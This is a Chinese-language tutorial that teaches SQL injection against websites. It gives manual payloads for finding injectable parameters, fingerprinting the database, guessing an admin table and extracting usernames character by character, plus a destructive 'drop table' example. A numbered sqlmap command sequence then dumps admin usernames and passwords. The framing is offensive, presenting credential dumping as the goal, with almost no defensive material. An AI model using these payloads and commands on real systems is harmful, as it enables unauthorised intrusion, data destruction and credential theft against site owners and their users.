
![](https://image.3001.net/images/20181114/15421266345186.png!420.280)


假如玩sql注入比较早的话，你会用过阿d，挖掘机...

但是最后还是sqlmap好用，搞网站突然Easy的很

- 存在注入的原因是因为后台在编写程序时，没有对用户输入的数据做过滤导致的，正如事实上，不是所有的用户都是友好的
　　比如：用户在某个输入框提交的参数是 2，浏览器提交的URL为: http:// www.XXX.com/index.php?id=2 服务器后台执行SQL语句： select * from table1 where id = 2;返回Response，浏览器解析返回的页面，然后你就看到新的页面了，如果邪恶的用户提交的参数是 2;drop table1
服务器后台执行SQL语句： select * from table1 where id =2 ; drop table1
相当于后台执行了两条SQL语句，查表，并且把table1删除 - -
从而导致了SQL注入。按照这个思路，现在写一下手工注入的一般步骤：
    - 判断是否存在注入点（数字型注入）
　　　　www.XXX.com/index.php?id=2‘--
　　　　www.XXX.com/index.php?id=2 and 1=1  --
　　　　www.XXX.com/index.php?id=2 and 1=2 --
　　　　第2条返回正常，第1，3条返回不正常说明id参数存在注入漏洞

    - 判断数据库类型

        可以根据不同数据库特有的表，或者根据不同数据库的语法不同进行判断

        www.XXX.com/index.php?id=2 and exists(select * from sysobjects) --      返回正常是SQLServer 数据库

        www.XXX.com/index.php?id=2 and exists(select * from msysobjects) --     返回正常是Access 数据库

        www.XXX.com/index.php?id=2 and len('a') = 1 --　　返回正常是SQLServer或者MySQL

        www.XXX.com/index.php?id=2 and substring('abc','1','1') = a --　　返回正常是SQLServer

        www.XXX.com/index.php?id=2 and subStr('abc','1','1')= a --　　返回正常是Oracle

        知道是哪种类型数据库后就可以选择对应语法构造SQL语句进行攻击
    - 判定是否存在admin表

        www.XXX.com/index.php?id=2 and exists(select * from admin) --  返回正常 存在admin表

    - 猜admin表中的字段名

        www.XXX.com/index.php?id=2 and exists(select username from admin) --  返回正常 表示admin表存在username字段

    - 猜字段值

　　　　 www.XXX.com/index.php?id=2 and exists(select * from admin where id =1 and asc(mid(username,1,1))) < 100 -- 返回正常说明username中有ascii码小于100的字母，然后根据折半发准确判断是哪一个字符


- 注入方式


 1. sqlmap.py -u "http://www.XXX.com/index.asp?id=1"

　　　　判断id参数是否存在注入：结果中包含 “id” is Vulnerable  字段表示存在注入

　　　　存在注入，下面的步骤才可以执行成功~

　　2. sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --dbs

　　　　列举能列出的所有数据库名

　　3. sqlmap.py -u "http://www.XXX.com/index.asp?id=1" --current-db

　　　　列出当前使用的数据库名，假设列出“sqltest”数据库　　

　　4. sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --is-dba

　　　　判断该注入点是否有管理员权限：返回true  表示是管理员

　　5. sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" --tables

　　　　获取sqltest中的所有表，假设有"admin"表

　　6. sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" --columns

　　　　列举表admin的字段（列名），假设存在"username","password"字段

　　7. sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" -C "username,password" --dump

　　　　下载字段username，password的值，若询问是否破解md5加密，选择no即可

至此，对一个简单的注入点（GET方式），现在就已经得到了我们想要的数据

想看工具的注入过程 使用-v参数

-level 会提高注入等级（默认0 只会判断get，post参数是否有注入点）

若注入点是POST方式，或是注入点才Cookie，User-Agent中，可以利用-Date 参数 -Cookie参数指定

当然用buip Suite架个代理，截取数据包，直接 -r 参数引入数据包也可以完成上述的注入情况的~